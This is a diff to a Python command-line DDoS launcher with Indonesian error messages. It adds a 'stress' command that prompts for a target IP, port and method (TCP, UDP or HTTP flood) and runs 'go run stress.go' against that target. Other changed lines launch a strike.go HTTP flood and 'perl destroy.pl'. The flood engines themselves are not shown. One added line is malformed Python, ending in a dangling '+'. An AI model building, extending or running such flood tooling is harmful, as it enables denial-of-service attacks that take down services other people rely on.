@@ -56,34 +56,34 @@ def countdown_a(t):
             return
 
 def picture():
-        stdout.write("                                 "+Fore.WHITE   +"        \n")
-        stdout.write("                                 "+Fore.WHITE   +"        \n")
-        stdout.write("                                 "+Fore.RED     +"                .  ....                  .,               \n")
-        stdout.write("                                 "+Fore.RED     +"            .',,,,,,,;;;.              'dOo              \n")
-        stdout.write("                                 "+Fore.RED     +"            .',,'.   ',,.             oKkOd              \n")
-        stdout.write("                                 "+Fore.RED     +"              .''. .                 'KOx0.              \n")
-        stdout.write("                                 "+Fore.RED     +"              ...,cddo;'            .O0d0l              \n")
-        stdout.write("                                 "+Fore.RED     +"               .:clol0Kxkc          d0dOd              \n")
-        stdout.write("                                 "+Fore.RED     +"              .,;;;;cloocol.       cKdkO              \n")
-        stdout.write("                                 "+Fore.RED     +"              ';:c;;clodldd.      .Kxx0.              \n")
-        stdout.write("                                 "+Fore.RED     +"             .;:cd,;,::c,:;.      Okd0'              \n")
-        stdout.write("                                 "+Fore.RED     +"              .',:,,,::o.;c.     dOoOo              \n")
-        stdout.write("                                 "+Fore.RED     +"           ...'''',;;clo,l      ;Kokk              \n")
-        stdout.write("                                 "+Fore.RED     +"       .',;;:ccl:;:,;,'.'.  ...'lolO              \n")
-        stdout.write("                                 "+Fore.RED     +"      .,;::cllllcl:c;:c:o.    .:,;;'              \n")
-        stdout.write("                                 "+Fore.RED     +"       .',::cccloco,ckxkOd:    ,lo   ;              \n")
-        stdout.write("                                 "+Fore.WHITE   +"       ...,;,;:llcl;:lkdxd,lc.;,,'              \n")
-        stdout.write("                                 "+Fore.WHITE   +"       ..;:lcllcx:l,,;;oo,.'..c,o,              \n")
-        stdout.write("                                 "+Fore.WHITE   +"        .';:;;;clcl.,'',,'lOx.'              \n")
-        stdout.write("                                 "+Fore.WHITE   +"         .',;,;c:c;coxdcoc:;:,'              \n")
-        stdout.write("                                 "+Fore.WHITE   +"        ...',;::;;coOOOkOOkl.'.              \n")
-        stdout.write("                                 "+Fore.WHITE   +"       ......':;;,.    .::cc,              \n")
-        stdout.write("                                 "+Fore.WHITE   +"      .,'   .,:lx.      .;cc:              \n")
-        stdout.write("                                 "+Fore.WHITE   +"           .,cdo.       .,ld.              \n")
-        stdout.write("                                 "+Fore.WHITE   +"          .,clx          'cd:              \n")
-        stdout.write("                                 "+Fore.WHITE   +"         'clxx,          .':coc,.              \n")
-        stdout.write("                                 "+Fore.WHITE   +"        \n")
-        stdout.write("                                 "+Fore.WHITE   +"        \n")
+        stdout.write("           "+Fore.WHITE   +"        \n")
+        stdout.write("           "+Fore.WHITE   +"        \n")
+        stdout.write("           "+Fore.RED     +"                .  ....                  .,               \n")
+        stdout.write("           "+Fore.RED     +"            .',,,,,,,;;;.              'dOo              \n")
+        stdout.write("           "+Fore.RED     +"            .',,'.   ',,.             oKkOd              \n")
+        stdout.write("           "+Fore.RED     +"              .''. .                 'KOx0.              \n")
+        stdout.write("           "+Fore.RED     +"              ...,cddo;'            .O0d0l              \n")
+        stdout.write("           "+Fore.RED     +"               .:clol0Kxkc          d0dOd              \n")
+        stdout.write("           "+Fore.RED     +"              .,;;;;cloocol.       cKdkO              \n")
+        stdout.write("           "+Fore.RED     +"              ';:c;;clodldd.      .Kxx0.              \n")
+        stdout.write("           "+Fore.RED     +"             .;:cd,;,::c,:;.      Okd0'              \n")
+        stdout.write("           "+Fore.RED     +"              .',:,,,::o.;c.     dOoOo              \n")
+        stdout.write("           "+Fore.RED     +"           ...'''',;;clo,l      ;Kokk              \n")
+        stdout.write("           "+Fore.RED     +"       .',;;:ccl:;:,;,'.'.  ...'lolO              \n")
+        stdout.write("           "+Fore.RED     +"      .,;::cllllcl:c;:c:o.    .:,;;'              \n")
+        stdout.write("           "+Fore.RED     +"       .',::cccloco,ckxkOd:    ,lo   ;              \n")
+        stdout.write("           "+Fore.WHITE   +"       ...,;,;:llcl;:lkdxd,lc.;,,'              \n")
+        stdout.write("           "+Fore.WHITE   +"       ..;:lcllcx:l,,;;oo,.'..c,o,              \n")
+        stdout.write("           "+Fore.WHITE   +"        .';:;;;clcl.,'',,'lOx.'              \n")
+        stdout.write("           "+Fore.WHITE   +"         .',;,;c:c;coxdcoc:;:,'              \n")
+        stdout.write("           "+Fore.WHITE   +"        ...',;::;;coOOOkOOkl.'.              \n")
+        stdout.write("           "+Fore.WHITE   +"       ......':;;,.    .::cc,              \n")
+        stdout.write("           "+Fore.WHITE   +"      .,'   .,:lx.      .;cc:              \n")
+        stdout.write("           "+Fore.WHITE   +"           .,cdo.       .,ld.              \n")
+        stdout.write("           "+Fore.WHITE   +"          .,clx          'cd:              \n")
+        stdout.write("           "+Fore.WHITE   +"         'clxx,          .':coc,.              \n")
+        stdout.write("           "+Fore.WHITE   +"        \n")
+        stdout.write("           "+Fore.WHITE   +"        \n")
 
 
 ######################################### user-agent block ###############################################
@@ -352,6 +352,18 @@ def get_info_l4():
     stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
     t = input()
     return target, port, thread, t
+    
+def get_info_l4b():
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"IP       "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
+    target = input()
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"PORT     "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
+    port = input()
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"METHODE  "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
+    stdout.write("\x1b[38;2;255;20;147m   "+Fore.WHITE+"OPTION   "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX+" 1=TCP-FLOOD 2=UDP-FLOOD 3=HTTP-FLOOD(AUTO SSL)"+Fore.LIGHTGREEN_EX+)
+    methode = input()
+    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
+    t = input()
+    return target, port, methode, t
 
 ################################################# ENGINE ###########################################################
 
@@ -520,11 +532,12 @@ def LaunchStrike(url, th, t):
 def AttackStrike(url, until_datetime):
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
-            os.system(f'cd godzilla && go run strike.go -url {url} GET')
+            os.system(f'go run strike.go -url {url} GET')
         except IndexError:
             #pass
             print('Usage: strike <url> <method> GET')
             print('Example: strike https://example.com GET')
+
 
 # PXRAW
 def LaunchPXRAW(url, th, t):
@@ -1569,7 +1582,18 @@ def command():
         try:
             os.system(f'perl destroy.pl {target} {port} 65500 {t}')
         except IndexError:
+            print('ISI YANG BENER DONG AH...') 
+    elif command == "stress":
+        target, port, methode, t = get_info_l4b()
+        try:
+            os.system(f'go run stress.go {target} {port} {methode} 1250 {t} 5')
+            while True:
+                picture()
+                countdown()
+        except IndexError:
             print('ISI YANG BENER DONG AH...')
+            print('METHODE PAKE ANGKA ..... ')
+            print('IP GA PAKE HTTPS ....... ')
 
 ##############################################################################################
     elif command == "subnet":
